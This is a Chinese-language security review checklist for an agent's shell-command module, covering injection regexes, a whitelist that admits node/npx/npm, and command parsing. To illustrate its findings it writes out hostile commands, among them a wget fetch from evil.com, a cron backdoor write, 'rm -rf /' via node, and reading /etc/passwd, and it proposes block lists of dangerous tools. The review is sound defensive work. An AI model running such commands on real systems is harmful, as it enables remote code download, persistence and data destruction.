# Phase 5c: TerminalHandler + shellSecurity — 代码审查清单

## 目标

审查 `packages/tools/terminal/` 下的 Shell 命令执行模块，确保：
1. **Shell 注入防护**无遗漏（危险字符、危险模式）
2. **白名单机制**不被绕过（特别是 `node`/`npx` 等可执行任意代码的命令）
3. **命令解析器**正确处理边界情况

---

## 涉及文件列表

| # | 文件路径 | 行数 | 风险等级 |
|---|---------|------|---------|
| 1 | `packages/tools/terminal/src/shellSecurity.ts` | ~25 | 🔴 极高 |
| 2 | `packages/tools/terminal/src/TerminalHandler.ts` | ~130 | 🔴 极高 |
| 3 | `packages/tools/terminal/src/index.ts` | 1 | 🟢 低（仅导出） |

---

## 关键审查要点

### 文件 1: `shellSecurity.ts` — Shell 注入防护

**⚠️ CRITICAL-01: 危险字符正则严重不完整**

当前正则 `/[;`]|\$\(|\${.*}/` 遗漏了大量可被利用的 shell metacharacters：
- **管道符 `|`**: `ls | cat /etc/passwd` — 虽然 `execFile` 不经过 shell，但如果白名单中有 `cat` 且参数包含 `|`，在某些实现中可能被利用
- **逻辑运算符 `&&`、`||`**: `true && rm -rf /` — 在 shell 环境中可链式执行
- **重定向符 `>`、`<`**: `echo "payload" > /etc/cron.d/backdoor` — 文件写入攻击
- **后台运行符 `&`**: `sleep 10 & wget http://evil.com/shell.sh` — 异步命令注入
- **感叹号 `!`**: bash history expansion，在某些 shell 中可触发意外行为

**建议**: 应使用更严格的白名单策略（只允许已知安全字符 `[a-zA-Z0-9._/\-\s+=:,]`），而非黑名单式检测。

---

**⚠️ CRITICAL-02: `ALWAYS_DANGEROUS_PATTERNS` 覆盖不全**

| 遗漏的危险命令 | 风险描述 |
|---------------|---------|
| `sudo` / `su` | 提权操作，可绕过所有权限限制 |
| `chown` / `chgrp` | 改变文件所有者，可能破坏系统安全模型 |
| `kill` / `pkill` / `killall` | 终止关键进程（如 Node.js 自身、其他 agent 实例） |
| `xargs` | 可构造任意命令执行链 |
| `eval` / `source` / `.` | 直接执行字符串中的代码，完全绕过白名单 |
| `curl` / `wget` | 下载并可能执行远程恶意脚本（即使不在白名单中，如果 agent 能写入文件再执行） |
| `python` / `perl` / `ruby` / `bash` / `sh` | 交互式解释器可执行任意代码 |

**建议**: 至少应阻止所有 shell 解释器和提权命令。

---

**⚠️ HIGH-03: `rm -rf/-fr` 检测过于宽松**

当前正则 `/^rm\s+(-rf|-fr)/` 只拦截了 `-rf` 和 `-fr`，但以下变体可以绕过：
- `rm -r /path/to/target` — 递归删除（无 force）
- `rm -f file1 file2 ...` — force 模式删除多个文件
- `rm --recursive --force path` — long form

**建议**: 应阻止所有带 `-r`/`--recursive` 或 `-f`/`--force` 标志的 rm 调用，或完全禁止 rm。

---

**⚠️ MEDIUM-04: `\${.*}` 正则贪婪匹配问题**

`\${.*}` 使用 `.*`（贪婪匹配），会匹配 `${HOME}/path/to/file` 等合法变量引用。这可能导致：
- **误报**: 合法命令被错误阻止，影响可用性
- **漏报风险**: 如果后续代码逻辑依赖精确匹配，贪婪行为可能产生意外结果

**建议**: 使用非贪婪匹配 `\${.*?}` 或更精确的正则 `/\\$\{[^}]+\}/`。

---

### 文件 2: `TerminalHandler.ts` — Shell 命令执行

**⚠️ CRITICAL-05: 白名单中包含可执行任意代码的命令（最高风险）**

```typescript
const DEFAULT_WHITELIST = new Set([
  // ...
  'node', 'npx', 'npm',   // ← 🔴 极度危险！
])
```

**`node`、`npx`、`npm` 可以执行任意代码，完全绕过白名单安全模型：**

| 命令 | 攻击向量示例 |
|------|-------------|
| `node -e "require('child_process').execSync('rm -rf /')"` | Node.js 直接调用系统命令 |
| `npx -y package-with-malicious-postinstall` | npm postinstall 脚本可执行任意代码 |
| `npm run evil-script` | scripts 中可包含任意 shell 命令 |

**这是整个模块最大的安全漏洞**。白名单机制对 `node`/`npx`/`npm` 完全无效，因为这些工具本身就是"万能钥匙"。

**建议**: 
1. **立即从白名单中移除 `node`、`npx`、`npm`**
2. 或者：对这些命令实施额外的参数白名单（如只允许 `node --version`）
3. 长期方案：使用沙箱或容器化执行环境

---

**⚠️ HIGH-06: `execFile` vs `exec` — 当前实现相对安全但需确认**

代码使用了 `child_process.execFile()`（而非 `exec()`），这意味着：
- ✅ **优点**: 不经过 shell，参数不会被 shell 解析，metacharacters 作为字面量处理
- ⚠️ **风险**: 如果 `name` 不在 PATH 中或不是可执行文件，行为取决于平台

**需要确认的点**:
1. `execFile` 在 Windows 上对 `.bat`/`.cmd` 文件的处理 — 是否会通过 cmd.exe 间接调用 shell？
2. `name` 参数是否被 sanitize（如防止 `../node` 路径遍历）？

---

**⚠️ HIGH-07: `parseCommand()` 引号处理不完整**

当前解析器对以下边界情况的处理存在风险：

| 场景 | 当前行为 | 风险 |
|------|---------|------|
| 嵌套引号 `"it's \"fine\""` | 未处理转义引号内的引号 | 可能错误分割参数 |
| 空字符串参数 `""` | 被忽略（不加入 parts） | 语义丢失 |
| 连续空格 `ls   -la` | 正确处理（跳过多余空格） | ✅ 无问题 |
| 尾部空格 `ls -la ` | 正确处理 | ✅ 无问题 |

**建议**: 使用成熟的 shell 解析库如 `shell-quote` 或 `@iarna/toml` 风格的解析器，而非手写。

---

**⚠️ MEDIUM-08: 双重安全检查的冗余与不一致**

代码中对 `checkShellInjection()` 调用了两次：
```typescript
// 第一次：检查原始命令
const injection = checkShellInjection(command)

// ... parseCommand() ...

// 第二次：检查完整命令（含参数）
const danger = checkShellInjection(fullCommand)
if (danger?.reason.startsWith('Blocked')) { ... }
```

**问题**: 
1. 第一次检查后，`parseCommand()` 可能改变了命令结构（如引号处理），导致第二次检查结果与第一次不同
2. `danger?.reason.startsWith('Blocked')` — 只有以 "Blocked" 开头的 reason 才会被拦截，而 `checkShellInjection()` 返回的注入检测 reason 是 `'Potential injection detected'`，不会被此条件捕获

**建议**: 统一安全检查逻辑，避免重复调用和条件不一致。

---

**⚠️ MEDIUM-09: 输出截断策略不一致**

```typescript
// execFile maxBuffer = 20KB (20 * 1024)
maxBuffer: 20 * 1024,

// 但输出截断阈值是 10KB
if (output.length > 10 * 1024) { ... }
```

**问题**: 
- `execFile` 的 `maxBuffer` 在超过时会抛出错误（`stderr: 'stdout maxBuffer exceeded'`），这个错误会被 catch 块捕获并返回给用户
- 但 10KB 截断逻辑永远不会触发，因为 20KB 时进程已经被杀了

**建议**: 统一这两个值，或明确说明设计意图。

---

## 审查结论优先级排序

| 优先级 | 问题编号 | 描述 | 影响 |
|--------|---------|------|------|
| P0 🔴 | CRITICAL-05 | `node`/`npx`/`npm` 在白名单中可执行任意代码 | **系统完全被攻破** |
| P0 🔴 | CRITICAL-01 | 危险字符正则遗漏大量 shell metacharacters | Shell 注入风险 |
| P1 🟠 | HIGH-06 | `execFile` 在 Windows 上的间接 shell 调用 | 平台特定绕过 |
| P1 🟠 | HIGH-07 | `parseCommand()` 引号处理不完整 | 参数注入风险 |
| P1 🟠 | HIGH-03 | `rm -rf/-fr` 检测过于宽松 | 递归删除可被绕过 |
| P2 🟡 | MEDIUM-04 | `\${.*}` 贪婪匹配问题 | 误报/漏报 |
| P2 🟡 | MEDIUM-08 | 双重安全检查冗余与不一致 | 安全逻辑漏洞 |
| P3 🟢 | LOW-09 | maxBuffer 与截断阈值不一致 | 用户体验问题 |

---

## 建议的修复方向

1. **立即移除 `node`、`npx`、`npm`** — 这是最高优先级的安全修复
2. **收紧白名单** — 只保留真正需要的命令，对每个命令评估必要性
3. **使用字符白名单替代正则黑名单** — 只允许 `[a-zA-Z0-9._/\-\s+=:,]` 等安全字符
4. **添加 `sudo`、`su`、`eval`、`bash`、`sh` 到阻止列表**
5. **考虑使用沙箱/容器化执行环境** — 从根本上隔离命令执行
